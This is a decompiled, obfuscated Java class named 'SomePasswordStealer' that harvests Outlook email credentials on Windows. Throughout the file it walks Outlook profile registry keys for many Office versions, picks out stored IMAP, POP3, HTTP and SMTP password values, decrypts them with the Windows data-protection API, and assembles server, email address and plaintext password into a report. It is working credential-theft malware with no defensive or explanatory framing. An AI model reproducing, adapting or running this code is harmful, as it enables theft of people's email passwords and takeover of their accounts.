package carLambo;

import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.Crypt32Util;
import com.sun.jna.platform.win32.WinReg;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;

public final class SomePasswordStealer {
   // $FF: synthetic method
   private static byte[] sdfsldf(byte[] var0) {
      byte[] var1 = new byte[var0.length - 1];

      int var2;
      for(int var10000 = var2 = 0; var10000 < var1.length; var10000 = var2) {
         int var10001 = var2;
         byte var10002 = var0[var2 + 1];
         ++var2;
         var1[var10001] = var10002;
      }

      try {
         byte[] var4 = Crypt32Util.cryptUnprotectData(var1);
         return var4;
      } catch (Exception var3) {
         return "Cannot decode password".getBytes();
      }
   }

   // $FF: synthetic method
   private static boolean sdfsldf(Set var0, String var1) {
      Iterator var2 = var0.iterator();

      do {
         if (!var2.hasNext()) {
            return false;
         }
      } while(!((String)var2.next()).toLowerCase().contains(var1.toLowerCase()));

      return true;
   }

   public final String sdfsldf() {
      ArrayList var1 = new ArrayList();
      var1.add("Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook");
      var1.add("Software\\Microsoft\\Windows Messaging Subsystem\\Profiles");
      String[] var2 = new String[]{"7.0", "8.0", "9.0", "10.0", "11.0", "12.0", "14.0", "15.0", "16.0"};

      int var4;
      int var10000;
      for(var10000 = var4 = 0; var10000 < 9; var10000 = var4) {
         String var5 = var2[var4];
         Object[] var10002 = new Object[1];
         ++var4;
         var10002[0] = var5;
         var1.add(String.format("Software\\Microsoft\\Office\\%s\\Outlook\\Profiles\\Outlook", var10002));
      }

      ArrayList var15 = new ArrayList();
      Iterator var3 = var1.iterator();

      String var8;
      while(var3.hasNext()) {
         String var18 = (String)var3.next();

         try {
            List var20;
            if ((var20 = WindowsRegUtil.invokeMethod(-2147483647, var18, 0)) != null) {
               Iterator var13 = var20.iterator();

               while(var13.hasNext()) {
                  String var6 = (String)var13.next();
                  Iterator var7 = WindowsRegUtil.invokeMethod(-2147483647, (new StringBuilder()).insert(0, var18).append("\\").append(var6).toString(), 0).iterator();

                  while(var7.hasNext()) {
                     var8 = (String)var7.next();
                     var8 = (new StringBuilder()).insert(0, var18).append("\\").append(var6).append("\\").append(var8).toString();
                     TreeMap var9;
                     if ((var9 = Advapi32Util.registryGetValues(WinReg.HKEY_CURRENT_USER, var8)) != null && sdfsldf(var9.keySet(), "password")) {
                        var15.add(var9);
                     }
                  }
               }
            }
         } catch (Exception var12) {
            var12.printStackTrace();
         }
      }

      StringBuilder var17 = new StringBuilder();
      if (var15.size() > 0) {
         String[] var19 = new String[]{"IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password"};
         Iterator var21;
         Iterator var28 = var21 = var15.iterator();

         while(var28.hasNext()) {
            Map var14 = (Map)var21.next();
            byte[] var22 = null;
            var2 = var19;

            int var24;
            for(var10000 = var24 = 0; var10000 < 4; var10000 = var24) {
               String var25 = var2[var24];
               if (var14.get(var25) != null && (var22 = (byte[])var14.get(var25)) != null && var22.length > 0) {
                  var22 = sdfsldf(var22);
                  break;
               }

               ++var24;
            }

            byte[] var16 = null;
            Object var23;
            if ((var23 = var14.get("Email")) != null) {
               try {
                  var16 = ((String)var23).getBytes();
               } catch (Exception var11) {
                  var16 = (byte[])var23;
               }
            }

            byte[] var26 = null;
            Object var27;
            if ((var27 = var14.get("SMTP Server")) != null) {
               try {
                  var26 = ((String)var27).getBytes();
               } catch (Exception var10) {
                  var26 = (byte[])var27;
               }
            }

            var8 = String.format("SMTP Server: %s \r\nEmail: %s \r\nPassword: %s \r\n", var26 == null ? "" : (new String(var26)).replace("\u0000", ""), var16 == null ? "" : (new String(var16)).replace("\u0000", ""), var22 == null ? "" : (new String(var22)).replace("\u0000", ""));
            var28 = var21;
            var17.append(var8 + "\r\n");
         }
      } else {
         var17.append("No Password found");
      }

      return var17.toString();
   }
}
